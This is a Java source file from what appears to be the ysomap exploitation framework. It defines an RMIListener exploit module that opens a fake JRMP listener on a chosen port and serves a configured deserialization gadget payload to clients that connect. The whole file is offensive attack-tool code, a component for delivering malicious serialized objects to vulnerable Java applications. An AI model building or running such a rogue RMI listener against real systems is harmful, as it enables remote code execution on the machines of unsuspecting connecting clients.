package ysomap.exploit.rmi;

import org.jline.reader.UserInterruptException;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.exploit.Exploit;
import ysomap.exploit.rmi.component.FakeRMIHandler;
import ysomap.util.Logger;

import java.io.IOException;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 */
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"all gadgets"})
@Dependencies({"need set a gadget to return"})
public class RMIListener extends Exploit {

    @Require(name = "lport", type = "int", detail = "local port to start a RMI service")
    public String lport;

    public Object payload;

    public String payloadName;

    private FakeRMIHandler handler;

    @Override
    public void run() {
        try {
            System.err.println("* Opening JRMP listener on " + lport);
            handler = new FakeRMIHandler(Integer.parseInt(lport), payload);
            handler.run();
        } catch (IOException e) {
            System.err.println("[-] Listener error");
            e.printStackTrace();
        } catch (UserInterruptException e){
            // do nothing but stop
            return;
        }
    }

    @Override
    public void stop() {
        if(handler != null){
            handler.close();
            exit = true;
            Logger.success("* JRMP listener stopped");
        }
    }

    @Override
    public String toString() {
        return "RMIListener{" +
                "lport='" + lport + '\'' +
                ", payload=" + payloadName +
                '}';
    }
}
